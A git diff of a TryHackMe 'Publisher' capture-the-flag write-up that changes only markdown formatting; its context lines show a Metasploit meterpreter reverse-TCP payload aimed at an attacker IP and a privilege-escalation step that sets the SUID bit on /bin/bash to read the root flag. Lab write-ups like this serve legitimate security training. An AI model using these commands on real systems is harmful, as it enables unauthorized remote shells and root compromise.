@@ -56,7 +56,7 @@ set PAYLOAD php/meterpreter/reverse_tcp
 set LHOST <YOUR_ATTACKER_IP> (in my case, my VPN IP)
 ```
 
-    ![msfconsole](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/08.png)
+![msfconsole](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/08.png)
 
 - Then I navigated to ```/home/think``` and found the first flag.
 
@@ -135,10 +135,7 @@ chmod +x /dev/shm/test.pl
 echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
 ```
 
-- This script does the following:
-
-```chmod +s /bin/bash```
-  - Sets the SUID bit on /bin/bash, allowing it to inherit the owner’s privileges (root) when executed.
+- This script does the following: ```chmod +s /bin/bash``` → Sets the SUID bit on /bin/bash, allowing it to inherit the owner’s privileges (root) when executed.
 
 - Now, if we run ```/bin/bash -p``` and execute ```cat /root/root.txt``` or ```id```, we can see the final flag and confirm we have root privileges.
 
